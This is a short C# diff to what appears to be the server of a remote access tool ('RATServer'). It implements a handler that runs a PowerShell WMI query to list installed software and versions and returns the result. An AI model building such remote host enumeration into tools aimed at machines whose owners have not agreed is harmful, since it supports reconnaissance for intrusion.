@@ -162,13 +162,19 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
             return r;
         }
-        public static Response Applications()
+        public static Response Software()
         {
-            //work in progress
             Response r = new Response { Type = "Message" };
             try
             {
-                r.Msg = "ApplicationsList";
+                Process p = new Process();
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.FileName = "powershell.exe";
+                p.StartInfo.Arguments = $"-Command \"Get-WmiObject -Class Win32_Product|select Name, Version\"";
+                p.Start();
+                r.Msg = p.StandardOutput.ReadToEnd();
+                p.WaitForExit();
             }
             catch (Exception e) { r.Msg = e.Message; }        
             return r;
